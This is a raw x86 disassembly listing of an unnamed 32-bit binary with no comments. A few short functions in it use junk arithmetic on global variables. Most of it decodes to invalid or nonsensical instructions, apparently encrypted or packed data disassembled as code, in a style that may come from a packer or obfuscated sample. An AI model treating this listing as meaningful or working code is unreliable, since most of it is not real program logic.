  40409c:	push   ebp
  40409d:	dec    esp
  40409e:	adc    esp,DWORD PTR [ebp-0x19]
  4040a1:	(bad)  [edx]
  4040a3:	dec    edx
  4040a4:	sub    DWORD PTR [eax+0x4eee398f],esp
  4040aa:	aas    
  4040ab:	sub    ebx,DWORD PTR [ecx+0x72]
  4040ae:	mov    ds:0x73079012,eax
  4040b3:	push   edx
  4040b4:	test   BYTE PTR [ecx+eax*1-0x6034ae9d],bl
  4040bb:	sti    
  4040bc:	mov    dl,0x4a
  4040be:	mov    edi,DWORD PTR ss:[esi]
  4040c1:	pushf  
  4040c2:	inc    ecx
  4040c3:	push   ebx
  4040c4:	and    BYTE PTR [eax+0x37ce8e85],al
  4040ca:	(bad)  
  4040cb:	int3   
  4040cc:	fistp  WORD PTR [esi]
  4040ce:	aas    
  4040cf:	hlt    
  4040d0:	mov    eax,DWORD PTR [esp+ecx*2]
  4040d3:	xchg   esp,eax
  4040d4:	cli    
  4040d5:	or     ecx,0x81161d8f
  4040db:	mov    eax,ecx
  4040dd:	pop    ebp
  4040de:	ret    0x18
  4040e1:	push   ebp
  4040e2:	mov    ebp,esp
  4040e4:	sub    esp,0x58
  4040e7:	xor    DWORD PTR ds:0x433633,0x2c9d
  4040f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4040f4:	sbb    eax,DWORD PTR ds:0x433673
  4040fa:	mov    eax,0x8a3a
  4040ff:	sub    DWORD PTR ds:0x4335ab,0x44c4
  404109:	xor    ax,WORD PTR [ecx+0x20]
  40410d:	sub    ecx,0x3d49
  404113:	mov    ecx,0x3b00
  404118:	xor    DWORD PTR ds:0x433547,0x649a
  404122:	add    ax,cx
  404125:	movzx  eax,ax
  404128:	mov    DWORD PTR [ebp-0xc],eax
  40412b:	mov    ecx,DWORD PTR ds:0x43365b
  404131:	and    DWORD PTR ds:0x433627,ecx
  404137:	mov    BYTE PTR [ebp-0x1],0x7f
  40413b:	sub    ecx,0x46a5
  404141:	lea    eax,[ebp-0x1]
  404144:	mov    DWORD PTR [ebp-0x10],eax
  404147:	adc    DWORD PTR ds:0x43353f,ecx
  40414d:	mov    al,BYTE PTR [ebp-0x1]
  404150:	movzx  ecx,WORD PTR ds:0x433543
  404157:	or     ecx,DWORD PTR ds:0x433597
  40415d:	mov    DWORD PTR ds:0x433543,ecx
  404163:	mov    ecx,DWORD PTR [ebp-0x10]
  404166:	xor    al,0x45
  404168:	sub    DWORD PTR ds:0x4335f3,0x7f5e
  404172:	sub    al,0x39
  404174:	mov    BYTE PTR [ecx],al
  404176:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40417d:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  404184:	add    DWORD PTR ds:0x43365b,ebx
  40418a:	mov    eax,DWORD PTR [ebp-0x8]
  40418d:	sbb    ecx,0x3751
  404193:	mov    ecx,0x7510853
  404198:	jmp    0x40436a
  40419d:	mov    ds,ebp
  40419f:	inc    eax
  4041a0:	add    DWORD PTR [ebx-0x6f],0x1318dd55
  4041a7:	and    edx,esp
  4041a9:	dec    edi
  4041aa:	(bad)  [ebx]
  4041ac:	sbb    eax,0x7c7c24a8
  4041b1:	stos   DWORD PTR es:[edi],eax
  4041b2:	jg     0x404230
  4041b4:	jl     0x4041d0
  4041b6:	xchg   edi,eax
  4041b7:	jle    0x4041af
  4041b9:	loopne 0x40421d
  4041bb:	loope  0x4041a0
  4041bd:	int3   
  4041be:	add    BYTE PTR [esi],ch
  4041c0:	cwde   
  4041c1:	sti    
  4041c2:	add    al,0x6e
  4041c4:	test   DWORD PTR [ebx+0x2c189dbc],ecx
  4041ca:	repz rcl bl,cl
  4041cd:	pusha  
  4041ce:	xchg   ecx,eax
  4041cf:	daa    
  4041d0:	fpatan 
  4041d2:	dec    edx
  4041d3:	adc    esp,DWORD PTR [edx-0xd]
  4041d6:	xor    dl,bl
  4041d8:	bound  ecx,QWORD PTR [edx]
  4041da:	sbb    al,0xb7
  4041dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041de:	inc    dl
  4041e0:	fidivr DWORD PTR cs:[edi+ecx*2-0x61f8aa]
  4041e8:	push   edx
  4041e9:	icebp  
  4041ea:	xchg   edx,eax
  4041eb:	imul   edx,DWORD PTR [ebp+ebp*8+0xd],0xffffffa0
  4041f0:	cmp    al,0xba
  4041f2:	pop    eax
  4041f3:	xchg   DWORD PTR [ebp+0x78656fa3],esp
  4041f9:	xor    eax,0x3fc5c49a
  4041fe:	or     edi,DWORD PTR [ecx]
  404200:	icebp  
  404201:	addr16 sub edi,esi
  404204:	mov    edx,0xe3fe2485
  404209:	cwde   
  40420a:	rcr    DWORD PTR [ecx+0x61c44d5a],cl
  404210:	sub    ebp,eax
  404212:	fimul  WORD PTR [esi+0x22]
  404215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404216:	ja     0x4041c5
  404218:	push   esp
  404219:	int3   
  40421a:	in     al,dx
  40421b:	loope  0x404215
  40421d:	and    ch,cl
  40421f:	ret    0x520c
  404222:	push   0xffffff97
  404224:	pop    esp
  404225:	nop
  404226:	dec    DWORD PTR [edi+0x7e]
  404229:	and    eax,0x1dbdd9eb
  40422e:	mov    eax,ds:0x4a032959
  404233:	sub    ch,BYTE PTR [edx+0xf]
  404236:	inc    esi
  404237:	rol    edi,0x65
  40423a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40423b:	xor    eax,0x8b5fa981
  404240:	cmp    ah,dh
  404242:	mov    ebp,0x37c40096
  404247:	xor    DWORD PTR [ecx],0xf64b327f
  40424d:	das    
  40424e:	mov    ebx,0x5389724f
  404253:	sub    ch,BYTE PTR [esi+0x671f9173]
  404259:	je     0x404236
  40425b:	ds inc esp
  40425d:	popa   
  40425e:	aam    0x40
  404260:	cmp    BYTE PTR [eax+0x68da934c],al
  404266:	ins    DWORD PTR es:[edi],dx
  404267:	scas   al,BYTE PTR es:[edi]
  404268:	jle    0x404217
  40426a:	push   eax
  40426b:	js     0x404280
  40426d:	mov    ah,0xe
  40426f:	cmp    eax,0x421527b7
  404274:	gs pop ds
  404276:	and    DWORD PTR [edx+0x28],eax
  404279:	pop    edi
  40427a:	into   
  40427b:	push   edi
  40427c:	sub    ch,0x34
  40427f:	inc    eax
  404280:	inc    ebp
  404281:	call   0x79730011
  404286:	test   DWORD PTR [ebp+eiz*2-0x318bd14d],eax
  40428d:	retf   0xc88a
  404290:	nop
  404291:	and    BYTE PTR ds:0x9c4e201b,dh
  404297:	ins    BYTE PTR es:[edi],dx
  404298:	ss push bp
  40429b:	(bad)  
  40429c:	push   ebp
  40429d:	pop    esp
  40429e:	jns    0x40422e
  4042a0:	shr    BYTE PTR [eax-0x4],0xb0
  4042a4:	jmp    0xff35:0xd068cf2c
  4042ab:	and    DWORD PTR [eax],edx
  4042ad:	or     eax,0x46aaf98a
  4042b2:	test   BYTE PTR [ebx-0x43157e2],ah
  4042b8:	stos   DWORD PTR es:[edi],eax
  4042b9:	dec    ebx
  4042ba:	xchg   BYTE PTR [esi+eiz*1-0x64775f39],ch
  4042c1:	and    eax,0x1b2fc50b
  4042c6:	push   es
  4042c7:	retf   
  4042c8:	addr16 ror bh,0xda
  4042cc:	inc    ebx
  4042cd:	mov    bh,BYTE PTR [ebp-0x77d70533]
  4042d3:	lods   eax,DWORD PTR ds:[esi]
  4042d4:	mov    ebx,esp
  4042d6:	jbe    0x4042a8
  4042d8:	div    DWORD PTR ds:0x76ec78eb
  4042de:	push   edi
  4042df:	jns    0x404292
  4042e1:	jl     0x4042ff
  4042e3:	mov    esp,DWORD PTR [edx-0x1b80670f]
  4042e9:	jl     0x40426e
  4042eb:	cmp    ah,BYTE PTR [ecx+0x33]
  4042ee:	ror    BYTE PTR [esi-0x39],0xef
  4042f2:	lds    eax,FWORD PTR [edx]
  4042f4:	and    ah,BYTE PTR [ebx-0x4f588c2c]
  4042fa:	jno    0x40435e
  4042fc:	push   ss
  4042fd:	popa   
  4042fe:	and    eax,0xc1fa27d8
  404303:	mov    dl,BYTE PTR [ebx]
  404305:	loop   0x404297
  404307:	jo     0x404325
  404309:	int    0x5c
  40430b:	ret    0x7f7a
  40430e:	push   ecx
  40430f:	dec    esp
  404310:	stos   BYTE PTR es:[edi],al
  404311:	sub    edi,ecx
  404313:	loope  0x404323
  404315:	call   0xc668edc0
  40431a:	dec    esi
  40431b:	pop    edx
  40431c:	mov    dh,0x6a
  40431e:	aam    0x41
  404320:	adc    eax,0x9e51d033
  404325:	imul   ebp,ebx,0xd9591fbf
  40432b:	je     0x404383
  40432d:	in     eax,0x42
  40432f:	cmp    eax,0x53ac41de
  404334:	aam    0x4b
  404336:	and    esp,edi
  404338:	bound  edi,QWORD PTR [edi-0x98ec202]
  40433e:	push   cs
  40433f:	iret   
  404340:	push   ebx
  404341:	jbe    0x404337
  404343:	mov    bh,0xcd
  404345:	push   esp
  404346:	adc    ah,BYTE PTR [eax+ebp*1+0x55]
  40434a:	dec    ebx
  40434b:	add    BYTE PTR [ebx],bh
  40434d:	cwde   
  40434e:	jmp    0x67c1:0x2609e95c
  404355:	cmp    eax,0xbccb0dd4
  40435a:	xor    eax,0x916b53c5
  40435f:	(bad)  
  404360:	jbe    0x40430a
  404362:	pop    ecx
  404363:	in     al,0x70
  404365:	call   0x8156:0x8b82776c
  40436c:	or     eax,0x43361f
  404371:	inc    ebx
  404372:	inc    esi
  404373:	add    BYTE PTR [eax],al
  404375:	xor    eax,ecx
  404377:	add    DWORD PTR ds:0x43362f,0x1b4e
  404381:	mov    esi,0x32729a
  404386:	or     DWORD PTR ds:0x43362f,0x4335ef
  404390:	jmp    0x404562
  404395:	sub    ecx,DWORD PTR [edx]
  404397:	mov    esi,DWORD PTR [ebx-0x6dcc424b]
  40439d:	mov    cl,0x88
  40439f:	cmp    BYTE PTR [ecx],bh
  4043a1:	mov    esi,0xe77cfee4
  4043a6:	es jl  0x404425
  4043a9:	stos   DWORD PTR es:[edi],eax
  4043aa:	jg     0x404428
  4043ac:	jl     0x404357
  4043ae:	and    ebx,DWORD PTR ds:0xcee8d668
  4043b4:	out    0x77,eax
  4043b6:	push   ss
  4043b7:	adc    BYTE PTR [ebp+0x3f],al
  4043ba:	idiv   BYTE PTR [edx+0x62]
  4043bd:	retf   
  4043be:	cmp    al,0xe1
  4043c0:	adc    cl,BYTE PTR [eax-0x25f5f894]
  4043c6:	push   ebp
  4043c7:	out    dx,al
  4043c8:	push   edi
  4043c9:	test   DWORD PTR [esi-0x5a],0x22a8e0d2
  4043d0:	dec    edx
  4043d1:	cwde   
  4043d2:	out    0x15,eax
  4043d4:	(bad)  
  4043d5:	psubb  mm5,mm6
  4043d8:	(bad)  
  4043d9:	div    DWORD PTR [edi+0x220c67d1]
  4043df:	mov    cl,BYTE PTR [ebx+0x2f]
  4043e2:	push   esp
  4043e3:	(bad)  
  4043e4:	pop    esp
  4043e5:	imul   eax,ecx,0x1a
  4043e8:	pop    ss
  4043e9:	lahf   
  4043ea:	adc    DWORD PTR [ecx+0x4e],esp
  4043ed:	test   DWORD PTR [edx],esi
  4043ef:	addr16 rcl eax,cl
  4043f2:	xchg   esp,eax
  4043f3:	out    0x57,eax
  4043f5:	aas    
  4043f6:	daa    
  4043f7:	ins    DWORD PTR es:[edi],dx
  4043f8:	jbe    0x404440
  4043fa:	add    DWORD PTR [esi-0x77],ecx
  4043fd:	(bad)  
  4043fe:	in     al,dx
  4043ff:	rcl    ecx,cl
  404401:	add    ch,BYTE PTR [edi-0x2f69acce]
  404407:	adc    al,BYTE PTR ds:0x39144562
  40440d:	call   0x30f3ac09
  404412:	inc    esi
  404413:	pop    eax
  404414:	jg     0x4043b7
  404416:	sbb    eax,0x396528d8
  40441b:	mov    ds:0x1d60531b,al
  404420:	daa    
  404421:	sub    dh,bl
  404423:	and    bl,BYTE PTR [edx+0x7eb4dad]
  404429:	(bad)  
  40442a:	mov    bh,0x6
  40442c:	fs lahf 
  40442e:	test   DWORD PTR [edi+0x36],esp
  404431:	push   ss
  404432:	test   al,0x41
  404434:	adc    eax,edx
  404436:	push   cs
  404437:	(bad)  
  404438:	ret    0x3d7e
  40443b:	pop    ds
  40443c:	iret   
  40443d:	pop    ebx
  40443e:	sahf   
  40443f:	sbb    dl,BYTE PTR [edi]
  404441:	push   es
  404442:	clc    
  404443:	or     al,0x18
  404445:	nop
  404446:	test   DWORD PTR [ebx],esp
  404448:	add    bh,BYTE PTR [eax]
  40444a:	idiv   BYTE PTR [ebp+0x5b9fc59e]
  404450:	cmp    cl,BYTE PTR [edx+0x6a80f1a2]
  404456:	dec    esp
  404457:	(bad)  
  404458:	push   esp
  404459:	pop    DWORD PTR [ebp-0x5b]
  40445c:	lock push ds
  40445e:	xor    bh,BYTE PTR [esi-0x691ffd7]
  404464:	(bad)  
  404465:	jp     0x404487
  404467:	aam    0x38
  404469:	jne    0x4043ef
  40446b:	xor    edx,eax
  40446d:	fbld   TBYTE PTR [ecx]
  40446f:	ret    0x640b
  404472:	fidivr WORD PTR [eax+0x58f70e84]
  404478:	addr16 inc ebp
  40447a:	popa   
  40447b:	mov    esi,0xcf9d8b8c
  404480:	sub    eax,0x12e9e468
  404485:	cdq    
  404486:	(bad)  
  404487:	icebp  
  404488:	adc    esp,ebx
  40448a:	xchg   esi,eax
  40448b:	and    al,0xb4
  40448d:	retf   
  40448e:	repnz xchg ebp,eax
  404490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404491:	stos   DWORD PTR es:[edi],eax
  404492:	sar    BYTE PTR [esi+edx*4+0x492bc6ce],1
  404499:	scas   al,BYTE PTR es:[edi]
  40449a:	ret    
  40449b:	out    0x73,eax
  40449d:	mov    eax,ds:0xe6d45b68
  4044a2:	jno    0x4044cc
  4044a4:	addr16 push esp
  4044a6:	lods   eax,DWORD PTR ds:[esi]
  4044a7:	sub    DWORD PTR [ecx-0x21],ebp
  4044aa:	mov    bl,0xb8
  4044ac:	test   eax,0x15493409
  4044b1:	cmp    al,BYTE PTR gs:[ecx+esi*4-0x7ac6bca]
  4044b9:	dec    esp
  4044ba:	jecxz  0x4044f2
  4044bc:	or     BYTE PTR [eax+0x22],dl
  4044bf:	pop    es
  4044c0:	repnz out 0xef,eax
  4044c3:	das    
  4044c4:	stos   DWORD PTR es:[edi],eax
  4044c5:	adc    eax,0x2a9fe8d5
  4044ca:	jge    0x4044b3
  4044cc:	jmp    0x8ae1e69b
  4044d1:	dec    eax
  4044d2:	test   eax,0xcbb88413
  4044d7:	fidivr DWORD PTR [ebx]
  4044d9:	sbb    DWORD PTR [ecx+ecx*4-0x4c5e0e33],ecx
  4044e0:	out    0xc8,al
  4044e2:	in     al,0x5f
  4044e4:	push   0x7fd0b05e
  4044e9:	fnstsw WORD PTR [eax+0x7e]
  4044ec:	fsubr  st(7),st
  4044ee:	stos   BYTE PTR es:[edi],al
  4044ef:	inc    ebp
  4044f0:	loope  0x404530
  4044f2:	fs cmp bh,bl
  4044f5:	ret    0x9469
  4044f8:	loop   0x4044e7
  4044fa:	dec    eax
  4044fb:	aas    
  4044fc:	push   0xffffffb9
  4044fe:	ja     0x404548
  404500:	sti    
  404501:	push   ss
  404502:	push   ebx
  404503:	or     esp,DWORD PTR [edi+0x29f253d]
  404509:	inc    ebp
  40450a:	mov    esp,0xc6a9c585
  40450f:	clc    
  404510:	lods   eax,DWORD PTR ds:[esi]
  404511:	sub    dl,BYTE PTR [ebp+0x3b]
  404514:	imul   edi,DWORD PTR [esi+0x34f839f6],0xfffffff3
  40451b:	xchg   ebp,eax
  40451c:	cmp    ecx,DWORD PTR [ebx]
  40451e:	add    edx,DWORD PTR [ebx-0x260ad4b]
  404524:	sbb    ch,BYTE PTR [eax+0x3101f22b]
  40452a:	push   edi
  40452b:	push   ecx
  40452c:	neg    DWORD PTR [eax+0x2afd3b65]
  404532:	and    dh,BYTE PTR [ebx-0x20]
  404535:	mov    dl,0xb5
  404537:	mov    ecx,0x57dca74b
  40453c:	test   al,0x8b
  40453e:	jecxz  0x40455a
  404540:	repnz pop esi
  404542:	dec    edx
  404543:	(bad)  
  404544:	in     al,0x34
  404546:	cmp    bl,ch
  404548:	retf   0xcf75
  40454b:	dec    ebx
  40454c:	sub    eax,0xa08f29a9
  404551:	cmp    al,0xe7
  404553:	cmp    eax,DWORD PTR [edx-0x263dd1af]
  404559:	outs   dx,DWORD PTR ds:[esi]
  40455a:	in     al,0x92
  40455c:	inc    ebp
  40455d:	jecxz  0x404560
  40455f:	mov    bh,0xf7
  404561:	adc    eax,0xeee9c603
  404566:	add    DWORD PTR [eax],eax
  404568:	add    bh,al
  40456a:	add    eax,0x4335a7
  40456f:	bound  eax,QWORD PTR [bx+si]
  404572:	add    BYTE PTR [edx+0x5c7ff55],cl
  404578:	push   ebx
  404579:	xor    eax,0x1c060043
  40457e:	add    BYTE PTR [eax],al
  404580:	jmp    0x404752
  404585:	rol    DWORD PTR [edx+edi*1],cl
  404588:	push   ss
  404589:	aad    0xd2
  40458b:	ror    ebp,cl
  40458d:	mov    eax,0x16c2aa9d
  404592:	sbb    eax,DWORD PTR [esi+0x7c2012e4]
  404598:	jl     0x404545
  40459a:	jg     0x404618
  40459c:	jl     0x404618
  40459e:	and    DWORD PTR [edi-0x56],0x509cd4dd
  4045a5:	mov    ecx,gs
  4045a7:	cwde   
  4045a8:	mov    cl,0x9c
  4045aa:	(bad)  
  4045ab:	lock (bad) 
  4045ad:	pop    esp
  4045ae:	jecxz  0x4045a9
  4045b0:	xchg   edx,eax
  4045b1:	aas    
  4045b2:	in     eax,0xcf
  4045b4:	mov    ds:0x29c5631f,eax
  4045b9:	fstp   QWORD PTR [esi]
  4045bb:	xlat   BYTE PTR ds:[ebx]
  4045bc:	out    0x52,eax
  4045be:	inc    edx
  4045bf:	jg     0x404555
  4045c1:	fmul   st,st(4)
  4045c3:	and    ah,BYTE PTR [ecx+eiz*2-0x39]
  4045c7:	es adc edx,esp
  4045ca:	(bad)  
  4045cb:	(bad)  [ecx]
  4045cd:	iret   
  4045ce:	adc    edi,DWORD PTR [edi-0x27359c52]
  4045d4:	push   ss
  4045d5:	add    DWORD PTR [edx+0x61e6e8b],0x19c8eab3
  4045df:	data16 cs shl bl,1
  4045e3:	aaa    
  4045e4:	aaa    
  4045e5:	cmp    dl,BYTE PTR ds:0x3a836549
  4045eb:	pop    esi
  4045ec:	out    dx,al
  4045ed:	(bad)  
  4045ee:	idiv   dh
  4045f0:	push   ebp
  4045f1:	test   eax,0xef3b441d
  4045f6:	mov    al,0xa5
  4045f8:	test   BYTE PTR [ebx-0x6ec09bd8],bl
  4045fe:	sub    esp,DWORD PTR ds:0x7312e018
  404604:	fcom   QWORD PTR [eax+0x2a]
  404607:	push   eax
  404608:	cli    
  404609:	jecxz  0x40458e
  40460b:	jle    0x4045d6
  40460d:	in     eax,dx
  40460e:	push   ebx
  40460f:	mov    esp,0x71bb80f9
  404614:	gs repz (bad) 
  404617:	into   
  404618:	shl    dl,1
  40461a:	icebp  
  40461b:	xor    ebx,DWORD PTR [ebx]
  40461d:	inc    ecx
  40461e:	mov    ah,0xca
  404620:	cld    
  404621:	or     DWORD PTR [eax],ebp
  404623:	fmul   st,st(2)
  404625:	icebp  
  404626:	mov    dh,0xdd
  404628:	push   ecx
  404629:	(bad)  
  40462a:	or     eax,DWORD PTR [edi+0x3e443058]
  404630:	sbb    BYTE PTR [edi-0x74e57e94],dl
  404636:	dec    ebp
  404637:	push   ds
  404638:	jae    0x4046aa
  40463a:	outs   dx,DWORD PTR ds:[esi]
  40463b:	mov    dh,0x63
  40463d:	mov    ebx,0x12bf7cca
  404642:	pop    ecx
  404643:	jp     0x404653
  404645:	inc    eax
  404646:	or     dl,BYTE PTR [esi+0x51]
  404649:	mov    bh,0x51
  40464b:	enter  0x1974,0xfa
  40464f:	mov    edx,0xf2ae5c1e
  404654:	mov    ecx,DWORD PTR [edi+eiz*2-0x71]
  404658:	mov    edx,0x3374ac18
  40465d:	mov    ecx,0xa1020fb6
  404662:	mov    dh,0xbb
  404664:	pop    ds
  404665:	mov    al,0xd1
  404667:	or     eax,0x6ac19bfe
  40466c:	pushf  
  40466d:	xor    eax,0x2f0a0320
  404672:	loope  0x404679
  404674:	xlat   BYTE PTR ds:[ebx]
  404675:	mov    BYTE PTR [ebp+0x61],ch
  404678:	adc    cl,BYTE PTR [edx-0x2001e560]
  40467e:	sub    dl,BYTE PTR [esi]
  404680:	lods   al,BYTE PTR ss:[esi]
  404682:	mov    esp,0x26c5e60a
  404687:	cmp    BYTE PTR [esi],al
  404689:	jo     0x404664
  40468b:	adc    ebx,ebp
  40468d:	pop    eax
  40468e:	gs pop ebp
  404690:	fwait
  404691:	jo     0x4046e5
  404693:	call   0xc1e33533
  404698:	and    al,dl
  40469a:	and    BYTE PTR [ebx],0xf8
  40469d:	daa    
  40469e:	xor    al,BYTE PTR [eax+ecx*1+0x5d]
  4046a2:	out    0x80,eax
  4046a4:	jbe    0x4046f1
  4046a6:	rol    ch,0x43
  4046a9:	cmp    edx,ebp
  4046ab:	or     eax,esi
  4046ad:	retf   
  4046ae:	jge    0x404695
  4046b0:	int    0x4c
  4046b2:	fisttp DWORD PTR [esi-0x1b]
  4046b5:	sub    al,0xd6
  4046b7:	mov    edx,0x253b7510
  4046bc:	das    
  4046bd:	test   eax,0x26750b84
  4046c2:	(bad)  
  4046c3:	xor    bh,BYTE PTR [ebx-0x1d95e1c5]
  4046c9:	or     eax,0xde69a1f4
  4046ce:	nop
  4046cf:	mov    ds:0x36bf0e5a,eax
  4046d4:	cs iret 
  4046d6:	jle    0x40466f
  4046d8:	std    
  4046d9:	or     DWORD PTR [ecx],ebp
  4046db:	daa    
  4046dc:	jns    0x40473e
  4046de:	or     eax,0x89ff08a0
  4046e3:	xor    BYTE PTR [ecx+0x7d],bh
  4046e6:	sub    bh,ah
  4046e8:	(bad)  
  4046e9:	loopne 0x4046b0
  4046eb:	mov    eax,esp
  4046ed:	adc    ebp,ecx
  4046ef:	sbb    DWORD PTR [ecx+0x970ce4c],edx
  4046f5:	cwde   
  4046f6:	mov    esp,0xbbfe22f7
  4046fb:	enter  0x219,0x22
  4046ff:	mov    ds:0xef76b9e2,eax
  404704:	lahf   
  404705:	and    edx,DWORD PTR [ebx-0x7964b50f]
  40470b:	or     al,0xf5
  40470d:	das    
  40470e:	je     0x404692
  404710:	mov    bl,0x6d
  404712:	inc    ecx
  404713:	and    ah,bh
  404715:	mov    ecx,0x43028857
  40471a:	in     eax,dx
  40471b:	jnp    0x4046f1
  40471d:	add    ecx,DWORD PTR [esi-0x4a64d1f7]
  404723:	push   esi
  404724:	std    
  404725:	dec    edi
  404726:	pop    edx
  404727:	in     al,0x1d
  404729:	xor    DWORD PTR [esi-0x6b062d13],eax
  40472f:	repnz add eax,0x3e5f3718
  404735:	adc    dl,BYTE PTR [ecx]
  404737:	pusha  
  404738:	les    esp,FWORD PTR [ebx+0x6d]
  40473b:	mul    BYTE PTR [edi+eiz*1+0xaf6fa0a]
  404742:	pop    edx
  404743:	pop    ecx
  404744:	or     esp,DWORD PTR [esi+ecx*1-0x70]
  404748:	rol    BYTE PTR [ebx-0x20],0x28
  40474c:	icebp  
  40474d:	xchg   esi,eax
  40474e:	(bad)  
  40474f:	cmp    eax,0x5488f45a
  404754:	add    eax,0x5c740a8
  404759:	dec    edi
  40475a:	xor    eax,0xde30043
  40475f:	add    BYTE PTR [eax],al
  404761:	cmp    eax,0x40
  404764:	jb     0x404569
  40476a:	sub    eax,DWORD PTR ds:0x433657
  404770:	mov    edx,DWORD PTR [ebp-0x8]
  404773:	mov    DWORD PTR ds:0x43353f,0x14
  40477d:	cmp    DWORD PTR ds:0x43353f,0x0
  404784:	je     0x4047dd
  40478a:	cmp    DWORD PTR ds:0x43353f,0xa
  404791:	jne    0x4047ab
  404797:	push   DWORD PTR [ebp-0x24]
  40479a:	push   DWORD PTR [ebp-0xc]
  40479d:	push   0x42f8
  4047a2:	push   DWORD PTR [ebp-0x24]
  4047a5:	call   DWORD PTR ds:0x4120bc
  4047ab:	cmp    DWORD PTR ds:0x43353f,0xb
  4047b2:	jne    0x4047c3
  4047b8:	mov    eax,ds:0x43353f
  4047bd:	dec    eax
  4047be:	mov    ds:0x43353f,eax
  4047c3:	mov    eax,ds:0x43353f
  4047c8:	dec    eax
  4047c9:	mov    ds:0x43353f,eax
  4047ce:	jmp    0x40477d
  4047d3:	or     DWORD PTR ds:0x4335e3,0x7ef0
  4047dd:	mov    eax,DWORD PTR [ebp-0xc]
  4047e0:	xor    edx,ecx
  4047e2:	xor    DWORD PTR ds:0x4335d7,0x43366f
  4047ec:	add    edx,esi
  4047ee:	cmp    edx,eax
  4047f0:	mov    DWORD PTR ds:0x4335db,0x5bbb
  4047fa:	je     0x404a4f
  404800:	sbb    DWORD PTR ds:0x4335e7,edi
  404806:	push   ebx
  404807:	or     DWORD PTR ds:0x4335f3,ebx
  40480d:	jmp    0x4049df
  404812:	and    eax,0xfd09dbf4
  404817:	sbb    eax,0xea31f0f5
  40481c:	push   edx
  40481d:	loope  0x404841
  40481f:	sbb    dh,BYTE PTR [ecx]
  404821:	mov    edi,0x7c7c2349
  404826:	stos   DWORD PTR es:[edi],eax
  404827:	jg     0x4048a5
  404829:	jl     0x4048a7
  40482b:	sub    dl,BYTE PTR [edi+0x73661f8b]
  404831:	lea    edi,[edx-0x3e]
  404834:	push   ds
  404835:	or     bh,BYTE PTR [eax]
  404837:	xchg   edi,eax
  404838:	xchg   ebp,eax
  404839:	push   ds
  40483a:	iret   
  40483b:	frstor [edi]
  40483d:	adc    eax,0xc0e22aad
  404842:	test   ch,ah
  404844:	pop    eax
  404845:	aad    0xee
  404847:	rcr    BYTE PTR [edx],0x87
  40484a:	mov    ecx,DWORD PTR [esp+ebp*4+0x595c98a5]
  404851:	add    BYTE PTR [eax-0x6e],cl
  404854:	jne    0x40480f
  404856:	scas   eax,DWORD PTR es:[edi]
  404857:	and    DWORD PTR [edx+0x22],edx
  40485a:	into   
  40485b:	jl     0x404896
  40485d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40485e:	mov    ebx,0xa60e4844
  404863:	push   0xea0f091
  404868:	inc    ebx
  404869:	jge    0x4048c7
  40486b:	adc    al,BYTE PTR [esi]
  40486d:	push   eax
  40486e:	ror    ebp,1
  404870:	add    DWORD PTR [edi-0x223b662b],ebx
  404876:	sub    al,0x41
  404878:	pop    ecx
  404879:	push   0x3d
  40487b:	xchg   ebx,eax
  40487c:	pushf  
  40487d:	stos   BYTE PTR es:[edi],al
  40487e:	dec    ebx
  40487f:	out    0x5e,eax
  404881:	ss pop es
  404883:	pop    ds
  404884:	jae    0x404899
  404886:	pop    edi
  404887:	xchg   DWORD PTR [edi-0x11487868],esi
  40488d:	push   cs
  40488e:	mov    al,0xba
  404890:	es dec ebx
  404892:	push   0x267bcc8f
  404897:	outs   dx,DWORD PTR ds:[esi]
  404898:	pop    ds
  404899:	sub    DWORD PTR [ebx+eiz*4],edi
  40489c:	scas   al,BYTE PTR es:[edi]
  40489d:	popf   
  40489e:	mov    esp,0x807b0af2
  4048a3:	cmp    BYTE PTR [esp+ebp*1+0x34],cl
  4048a7:	aad    0xbc
  4048a9:	cmp    ecx,edi
  4048ab:	cdq    
  4048ac:	cmp    al,0xb7
  4048ae:	add    BYTE PTR [ecx],0x79
  4048b1:	cwde   
  4048b2:	jns    0x4048e2
  4048b4:	push   ds
  4048b5:	xchg   edi,eax
  4048b6:	fiadd  WORD PTR [esi-0x38]
  4048b9:	add    eax,DWORD PTR [ebx+0x3f7c1bed]
  4048bf:	je     0x404940
  4048c1:	pop    esi
  4048c2:	cmp    DWORD PTR [ecx+edx*8+0x13],0xffffffb8
  4048c7:	inc    esp
  4048c8:	inc    edx
  4048c9:	cs fsubrp st(3),st
  4048cc:	adc    eax,0x520ffdc9
  4048d1:	jg     0x404856
  4048d3:	mov    edx,0xfb7cca3a
  4048d8:	add    DWORD PTR [edi-0xf],esp
  4048db:	(bad)  
  4048dc:	push   0xa25f5ce9
  4048e1:	js     0x404897
  4048e3:	mov    edi,0xe36fe8f9
  4048e8:	imul   ebp,DWORD PTR [ecx-0x2],0xbc2faf00
  4048ef:	cmp    BYTE PTR [edx-0x53],ah
  4048f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048f3:	xchg   esi,eax
  4048f4:	mov    edi,edi
  4048f6:	fstp   st(7)
  4048f8:	mov    BYTE PTR [esi-0x30],bl
  4048fb:	sub    BYTE PTR [ebp+0x2c7214f3],cl
  404901:	lahf   
  404902:	xchg   esi,eax
  404903:	(bad)  
  404905:	inc    edi
  404906:	xor    al,0x4f
  404908:	int    0x65
  40490a:	popf   
  40490b:	repnz inc ecx
  40490d:	mov    esp,0x961cb249
  404912:	push   eax
  404913:	cli    
  404914:	add    BYTE PTR [ecx+0x39d64f3a],bh
  40491a:	mov    ebp,0x4273d561
  40491f:	pop    ss
  404920:	dec    ebp
  404921:	push   edx
  404922:	jle    0x404983
  404924:	das    
  404925:	add    edi,DWORD PTR [ebp+ebx*4-0x56b81b61]
  40492c:	scas   eax,DWORD PTR es:[edi]
  40492d:	mov    ah,0x15
  40492f:	icebp  
  404930:	pop    eax
  404931:	mov    gs,WORD PTR [ebx-0x161c6fc2]
  404937:	inc    eax
  404938:	push   esi
  404939:	cdq    
  40493a:	lea    esp,[ebx-0xd]
  40493d:	ss jecxz 0x40495b
  404940:	lahf   
  404941:	dec    ebp
  404942:	inc    esi
  404943:	mul    DWORD PTR [edi+ebp*8+0x6ecf3e88]
